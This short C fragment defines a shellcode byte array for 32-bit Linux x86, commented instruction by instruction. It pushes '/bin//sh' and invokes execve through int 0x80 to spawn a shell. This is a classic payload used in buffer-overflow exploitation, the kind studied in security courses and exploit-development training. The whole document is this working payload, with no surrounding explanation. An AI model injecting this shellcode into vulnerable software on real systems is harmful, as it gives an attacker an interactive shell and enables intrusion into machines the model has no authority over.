char shellcode[] = 
    "\x31\xc0"             // xor eax,eax
    "\x50"                 // push eax
    "\x68\x2f\x2f\x73\x68" // push '//sh'
    "\x68\x2f\x62\x69\x6e" // push '/bin'
    "\x89\xe3"             // mov ebx,esp
    "\x50"                 // push eax
    "\x53"                 // push ebx
    "\x89\xe1"             // mov ecx,esp
    "\xb0\x0b"             // mov al,0xb
    "\xcd\x80";            // int 0x80
